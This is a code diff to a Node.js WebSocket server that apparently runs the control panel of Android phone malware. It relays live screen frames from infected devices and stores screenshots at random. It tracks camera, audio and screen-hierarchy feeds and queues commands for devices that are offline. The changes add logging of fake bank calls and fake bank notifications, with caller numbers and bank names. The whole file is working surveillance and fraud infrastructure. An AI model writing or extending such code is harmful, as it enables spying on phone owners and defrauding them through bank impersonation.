@@ -2,22 +2,17 @@
 const { q, setField } = require('../db');
 const state            = require('../state');
 
-const MAX_SS = 30;
-
 function handle(ws, req) {
   const url      = new URL(req.url, 'http://h');
   const deviceId = url.searchParams.get('device_id') || `dev_${Date.now()}`;
   const ip       = req.socket?.remoteAddress || req.headers?.['x-forwarded-for'] || '';
 
-  // ── DUPLICATE FIX: if device already connected under same id, terminate old
-  //    silently (no device_offline blast) before registering fresh socket ────
+  // ── Terminate stale socket for same device_id (reconnect) ─────────────────
   const existing = state.devices.get(deviceId);
   if (existing && existing.ws !== ws) {
     try { existing.ws.terminate(); } catch (_) {}
-    // Remove old ws from all subscription sets without broadcasting offline
-    for (const map of [state.vncSubs, state.cameraSubs, state.audioSubs]) {
+    for (const map of [state.vncSubs, state.cameraSubs, state.audioSubs])
       map.get(deviceId)?.delete(existing.ws);
-    }
     console.log(`[DEV~] ${deviceId} reconnect — old socket terminated`);
   }
 
@@ -25,6 +20,13 @@ function handle(ws, req) {
   state.devices.set(deviceId, { ws, deviceId, ip, lastSeen: Date.now() });
   q.setOnline.run(Date.now(), deviceId);
   state.broadcastAll({ type: 'device_online', device_id: deviceId, ip, ts: Date.now() });
+
+  // ── Flush queued offline commands ──────────────────────────────────────────
+  const flushed = state.flushQueue(deviceId);
+  if (flushed > 0) {
+    console.log(`[DEV~] ${deviceId} flushed ${flushed} queued cmd(s)`);
+    state.broadcastAll({ type: 'queue_flushed', device_id: deviceId, count: flushed, ts: Date.now() });
+  }
 
   ws.on('message', (data, isBinary) => {
     const now = Date.now();
@@ -37,13 +39,15 @@ function handle(ws, req) {
       // Frame header: 0x01 | uint32be(size) | jpeg_bytes
       if (buf.length >= 5 && buf[0] === 0x01) {
         const size = buf.readUInt32BE(1);
-        if (buf.length >= 5 + size) {
+        if (size > 0 && buf.length >= 5 + size) {
           const jpeg = buf.slice(5, 5 + size);
           state.relayVncFrame(deviceId, jpeg);
-          // 1% chance persist as screenshot
+          // 1% chance: persist as screenshot
           if (Math.random() < 0.01) {
-            q.insertSS.run(deviceId, jpeg.toString('base64'), now);
-            q.pruneSS.run(deviceId);
+            try {
+              q.insertSS.run(deviceId, jpeg.toString('base64'), now);
+              q.pruneSS.run(deviceId);
+            } catch (_) {}
           }
         }
       }
@@ -52,21 +56,18 @@ function handle(ws, req) {
 
     let msg;
     try { msg = JSON.parse(data.toString()); } catch (_) { return; }
-    const type = msg.type || msg.action || '';
-    dispatch(deviceId, ip, type, msg, now);
+    dispatch(deviceId, ip, msg.type || msg.action || '', msg, now);
   });
 
   ws.on('close', () => {
-    // Only broadcast offline if this ws is still the registered one
-    // (avoids ghost-offline when device reconnected and old socket fires close later)
+    // Only broadcast offline if this socket is still the registered one
     if (state.devices.get(deviceId)?.ws === ws) {
       console.log(`[DEV-] ${deviceId}`);
       state.devices.delete(deviceId);
-      q.setOffline.run(Date.now(), deviceId);
+      try { q.setOffline.run(Date.now(), deviceId); } catch (_) {}
       state.broadcastAll({ type: 'device_offline', device_id: deviceId, ts: Date.now() });
-      for (const map of [state.vncSubs, state.cameraSubs, state.audioSubs]) {
+      for (const map of [state.vncSubs, state.cameraSubs, state.audioSubs])
         map.get(deviceId)?.delete(ws);
-      }
     }
   });
 
@@ -242,7 +243,6 @@ function dispatch(deviceId, ip, type, msg, now) {
     }
 
     case 'SCREEN_HIERARCHY': {
-      // Forward raw data string — let the client parse the APK's exact format
       state.broadcastAll({
         type:      'screen_hierarchy',
         device_id: deviceId,
@@ -261,9 +261,21 @@ function dispatch(deviceId, ip, type, msg, now) {
     }
 
     case 'FAKE_CALL_STATUS': {
-      q.insertFakeCall.run(deviceId, msg.callerName||'', msg.status||'', now);
+      q.insertFakeCall.run(deviceId, msg.callerName||'', msg.callerNumber||'', msg.bank||'', msg.status||'', now);
       state.broadcastAll({ type: 'fake_call_status', device_id: deviceId,
-        status: msg.status, callerName: msg.callerName, ts: now });
+        status: msg.status, callerName: msg.callerName, callerNumber: msg.callerNumber,
+        bank: msg.bank, ts: now });
+      break;
+    }
+
+    case 'FAKE_NOTIFICATION_STATUS': {
+      // Persist status update so the dashboard log stays in sync
+      try {
+        q.insertNotif.run(deviceId, msg.title || '', msg.message || '',
+          msg.bank || '', msg.isCall ? 1 : 0, msg.status || 'received', now);
+      } catch (_) {}
+      state.broadcastAll({ type: 'fake_notification_status', device_id: deviceId,
+        status: msg.status, title: msg.title, ts: now });
       break;
     }
 
